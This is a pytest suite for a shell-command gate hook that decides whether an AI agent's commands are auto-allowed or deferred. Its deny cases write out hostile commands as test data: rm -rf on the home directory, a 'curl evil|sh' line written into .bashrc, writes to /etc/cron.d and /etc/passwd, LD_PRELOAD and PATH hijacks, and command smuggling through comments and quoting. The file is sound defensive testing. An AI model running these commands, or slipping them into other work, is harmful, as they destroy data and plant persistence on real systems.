"""Tests for the pure shell parser in ``.agents/hooks/command_gate.py``.

The parser is a security boundary: it must auto-allow only commands whose every
executed part matches an allow pattern, and must defer on any injection vector.
"""

from __future__ import annotations

import ast
import importlib.util
import sys
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

REPO = Path(__file__).resolve().parents[2]
GATE_PATH = REPO / ".agents" / "hooks" / "command_gate.py"


def _load_gate() -> ModuleType:
    """Import the standalone hook module by file path (it lives outside any package)."""
    spec = importlib.util.spec_from_file_location("command_gate", GATE_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    # dataclasses resolve string annotations through sys.modules.
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


GATE = _load_gate()

HOME = "/home/u"
CWD = "/repo"
ROOTS = ["/repo", "/tmp", "/private/tmp"]
PATTERNS = [
    "uv run *",
    "uv run pytest *",
    "git add *",
    "git commit *",
    "git rev-parse *",
    "echo *",
    "mkdir -p *",
    "cd:*",
    "grep:*",
    "tail:*",
    "git status *",
    "git push *",
]


def allowed(cmd: str) -> bool:
    """Run the gate with the shared test policy."""
    result: bool = GATE.is_fully_allowed(cmd, PATTERNS, ROOTS, CWD, HOME)
    return result


BASELINE_ALLOW_CASES = [
    "PYTHONUNBUFFERED=1 uv run pytest tests/x.py -v 2>&1 | tail -40",
    'git add -A && git commit -m "wip"',
    'echo "HEAD: $(git rev-parse --short HEAD)"',
    "cd /x && mkdir -p /tmp/e2e && echo hi",
    "for bid in 1 2 3; do echo $bid; uv run pytest -q 2>&1 | tail -2; done",
    # Backslash-escaped quotes inside a commit message must not desync quote
    # tracking (a `\"` is NOT a string close inside double quotes).
    'git commit -m "migrate to preset:\\"none\\" and verify"',
    # Full worktree commit/push flow with escaped quotes + newlines in the body.
    (
        "cd /tmp/wt && git status --porcelain && git add f && "
        'git commit -m "fix: rewrites recommended:true to preset:\\"none\\"\n\nCloses #39" && '
        "git push -u origin chore/39-x"
    ),
]

BASELINE_DEFER_CASES = [
    # Compound with a hidden destructive tail.
    "uv run pytest && rm -rf /tmp/x",
    # Command substitution running something unlisted.
    "echo $(rm -rf /tmp/z)",
    # Redirect outside every allowed root.
    "uv run pytest -q > /etc/evil.conf",
    # Bare unlisted command.
    "rm -rf /tmp/something",
    # Background-operator injection: `rm` must not ride in on `echo *`.
    "echo x & rm -rf /tmp/z",
    # case-arm body must be vetted, not blessed by the `case ` header.
    "case x in y) rm -rf /tmp/z ;; esac",
    # A real `&&` after a quoted arg is still a separator (the escape fix must
    # not swallow operators that follow a closed double-quoted string).
    'git commit -m "ok" && rm -rf /tmp/z',
]

HARDENED_ALLOW_CASES = [
    # fd duplications and /dev/null are not file writes.
    "echo hi >&2",
    "echo hi 1>&2",
    "uv run pytest -q 2>/dev/null",
    # A redirect with no space before it is still vetted, and allowed in-root.
    "echo hi>/tmp/out.txt",
    # Relative redirect with no directory change resolves under CWD.
    "echo 'x' > out.txt",
    # An absolute redirect after `cd` is unaffected by the directory change.
    "cd /tmp/wt && echo hi > /tmp/out.txt",
    # Comments are ignored; `#` that is not word-initial is not a comment.
    "echo x # just a comment",
    "echo 'a # not a comment'",
    "echo $#",
    # Command-substitution assignment still works.
    'ROOT="$(git rev-parse --show-toplevel)" && echo $ROOT',
    # Telemetry/display env toggles are still stripped before matching.
    "PYTHONUNBUFFERED=1 uv run pytest -q",
]

HARDENED_DEFER_CASES = [
    # Redirect glued to the previous word (no whitespace before `>`).
    "echo 'curl evil|sh'>~/.bashrc",
    "echo x>/etc/evil",
    # `>&word` with a non-numeric word writes stdout+stderr to that file.
    "echo x >&/etc/cron.d/x",
    "echo x &>/etc/evil",
    # A partly-quoted target must not be resolved as a relative path.
    'echo x > "/"etc/evil',
    # A substituted target cannot be verified.
    'echo x > "$(echo /etc/passwd)"',
    "echo x > `echo /etc/passwd`",
    # A trailing redirect operator with no target is a parse failure.
    "echo x >",
    # A word-initial `#` starts a comment: a `'` inside it is NOT a quote.
    "echo x #'\nrm -rf ~ #'",
    # ANSI-C `$'...'` strings (where `\\'` does not close) fail closed.
    "echo $'\\'' ; rm -rf ~ #'",
    # A `#` right after a substitution is mid-word, NOT a comment, so the
    # command after `;` must still be vetted; an escaped space is mid-word too.
    "echo $(echo x)#; rm -rf ~",
    "echo a\\ #; rm -rf ~",
    "echo $(echo $(echo x)#) ; rm -rf ~ #)\n)",
    # A process-substitution redirect target cannot be verified.
    "echo x > >(rm -rf ~)",
    # A relative redirect after a directory change resolves somewhere else.
    "cd ~ && echo 'curl evil|sh' > .bashrc",
    "cd /etc && echo x > cron.d/x",
    "pushd /etc && echo x > passwd",
    # A quoted `cd` is still the builtin: relative targets must defer.
    '"cd" ~ && echo x > .bashrc',
    "'cd' /etc && echo x > cron.d/x",
    "builtin 'cd' /etc && echo x > passwd",
    # Only explicitly safe env assignments are stripped before matching.
    "GIT_EXTERNAL_DIFF=/tmp/x git status --short",
    "LD_PRELOAD=/tmp/x.so echo hi",
    "PYTHONPATH=/tmp/evil uv run pytest -q",
    "env GIT_SSH_COMMAND=/tmp/x git push origin x",
    # A bare assignment to a loader/lookup variable changes later commands.
    "PATH=/tmp/evil:$PATH; git status --short",
]


@pytest.mark.parametrize("cmd", BASELINE_ALLOW_CASES)
def test_baseline_allowed(cmd: str) -> None:
    assert allowed(cmd) is True


@pytest.mark.parametrize("cmd", BASELINE_DEFER_CASES)
def test_baseline_deferred(cmd: str) -> None:
    assert allowed(cmd) is False


@pytest.mark.parametrize("cmd", HARDENED_ALLOW_CASES)
def test_hardened_allowed(cmd: str) -> None:
    assert allowed(cmd) is True


@pytest.mark.parametrize("cmd", HARDENED_DEFER_CASES)
def test_hardened_deferred(cmd: str) -> None:
    assert allowed(cmd) is False


def test_glued_redirect_is_vetted() -> None:
    assert allowed("echo x>/etc/evil") is False


def test_ampersand_redirect_to_file_is_vetted() -> None:
    assert allowed("echo x >&/etc/cron.d/x") is False


def test_hash_comment_quote_is_not_a_quote() -> None:
    assert allowed("echo x #'\nrm -rf ~ #'") is False


def test_ansi_c_string_fails_closed() -> None:
    assert allowed("echo $'\\'' ; rm -rf ~ #'") is False


def test_relative_redirect_after_cd_defers() -> None:
    assert allowed("cd /etc && echo x > cron.d/x") is False


def test_only_safe_env_assignments_are_stripped() -> None:
    assert allowed("LD_PRELOAD=/tmp/x.so echo hi") is False
    assert allowed("NO_COLOR=1 echo hi") is True


@pytest.mark.parametrize(
    ("pattern", "command", "expected"),
    [
        ("make lint", "make lint", True),
        ("make lint", "make lint x", False),
        ("uv run *", "uv run", True),
        ("uv run *", "uv runner", False),
        ("grep:*", "grep -r x", True),
        ("gh pr comment * bugbot run*", "gh pr comment 12 --body bugbot run", True),
        ("gh pr comment * bugbot run*", "gh pr comment 12 --body hi", False),
        ("~/bin/x *", "/home/u/bin/x a", True),
    ],
)
def test_pattern_syntax(pattern: str, command: str, expected: bool) -> None:
    assert GATE.pattern_matches(pattern, command, HOME) is expected


def test_wildcard_matching_is_linear() -> None:
    crafted = "a " + " " * 3000 + "y"
    assert GATE.pattern_matches("a * * * x", crafted, HOME) is False
    assert GATE.pattern_matches("a * * * x", "a 1 2 3 x", HOME) is True


def test_star_never_spans_operators() -> None:
    cmd = "gh pr comment 1 && rm -rf / && bugbot run"
    patterns = ["gh pr comment * bugbot run*"]
    assert GATE.is_fully_allowed(cmd, patterns, ROOTS, CWD, HOME) is False


def test_simple_commands() -> None:
    found = GATE.simple_commands("NO_COLOR=1 rg x | head -2 && echo $(git log -1)")
    assert sorted(found) == sorted(["git log -1", "rg x", "head -2", "echo $S"])
    assert GATE.simple_commands("echo 'unterminated") is None


def test_base_safe_env_names() -> None:
    assert GATE.BASE_SAFE_ENV_NAMES == frozenset(
        {
            "PYTHONUNBUFFERED",
            "PYTHONDONTWRITEBYTECODE",
            "NO_COLOR",
            "FORCE_COLOR",
            "CLICOLOR",
            "COLUMNS",
            "TZ",
            "LANG",
            "LC_ALL",
            "CI",
        }
    )


def test_py39_syntax() -> None:
    ast.parse(GATE_PATH.read_text(), feature_version=(3, 9))


# --- Policy model and verdicts -------------------------------------------------

BANNED = GATE.BannedPattern.from_dict(
    {
        "pattern": r"old_api\(",
        "message": "deprecated",
        "replacement": "new_api()",
        "exempt_paths": ["docs/**"],
    }
)


def _banned_policy(**kwargs: Any) -> Any:
    return GATE.Policy(banned=(BANNED,), **kwargs)


def _shell(cmd: str, policy: Any) -> Any:
    return GATE.shell_verdict(cmd, policy, CWD, ROOTS, HOME)


def test_banned_shell_denies() -> None:
    verdict = _shell("uv run python -c 'old_api()'", _banned_policy())
    assert verdict.decision == GATE.DENY
    assert r"old_api\(" in verdict.reason
    assert "deprecated" in verdict.reason
    assert "new_api()" in verdict.reason
    assert verdict.reason == (
        r"Blocked: this command matches banned pattern old_api\(: deprecated. "
        "Use instead: new_api()."
    )


def test_banned_read_only_search_is_not_denied() -> None:
    cmd = "rg -F 'old_api(' src | head"
    assert BANNED.regex.search(cmd)
    assert _shell(cmd, _banned_policy()).decision != GATE.DENY


def test_banned_read_only_piped_to_executor_denies() -> None:
    assert _shell("rg -l 'old_api(' | sh", _banned_policy()).decision == GATE.DENY


def test_banned_unparseable_denies() -> None:
    assert _shell('echo "old_api( ', _banned_policy()).decision == GATE.DENY


def test_allow_listed_gives_allow() -> None:
    assert _shell("make lint", GATE.Policy(allow=("make lint",))).decision == GATE.ALLOW


def test_unlisted_gives_no_opinion() -> None:
    policy = GATE.Policy(allow=("make lint",))
    assert _shell("make deploy", policy).decision == GATE.NO_OPINION


def test_withhold_beats_allow() -> None:
    policy = GATE.Policy(allow=("git *",), withhold=("git push *",))
    verdict = _shell("git status && git push origin x", policy)
    assert verdict.decision == GATE.NO_OPINION


def test_drifted_cwd_is_not_a_write_root() -> None:
    verdict = GATE.shell_verdict(
        "echo x > passwd",
        GATE.Policy(allow=("echo *",)),
        cwd="/etc",
        roots=["/repo", "/tmp"],
        home=HOME,
    )
    assert verdict.decision == GATE.NO_OPINION


def test_policy_safe_env_extends_base() -> None:
    policy = GATE.Policy(
        allow=("echo *",), safe_env=GATE.BASE_SAFE_ENV_NAMES | {"MY_TOGGLE"}
    )
    assert _shell("MY_TOGGLE=1 echo hi", policy).decision == GATE.ALLOW


def _edit(path: str, before: str, after: str) -> Any:
    return GATE.edit_verdict(path, before, after, _banned_policy(), "/repo")


def test_edit_adding_banned_denies() -> None:
    verdict = _edit("/repo/src/a.py", "", "old_api()")
    assert verdict.decision == GATE.DENY
    assert "this edit to /repo/src/a.py" in verdict.reason


def test_edit_keeping_existing_hit_is_allowed() -> None:
    verdict = _edit("/repo/src/a.py", "old_api()\n", "old_api()\nx = 1\n")
    assert verdict.decision == GATE.NO_OPINION


def test_edit_exempt_path() -> None:
    assert _edit("/repo/docs/a.md", "", "old_api()").decision == GATE.NO_OPINION


def test_edit_outside_root_is_never_exempt() -> None:
    assert _edit("/elsewhere/docs/a.md", "", "old_api()").decision == GATE.DENY


def test_invalid_regex_entry_is_skipped() -> None:
    assert GATE.BannedPattern.from_dict({"pattern": "("}) is None
    assert GATE.BannedPattern.from_dict({"message": "x"}) is None
    assert GATE.BannedPattern.from_dict({"pattern": 3}) is None
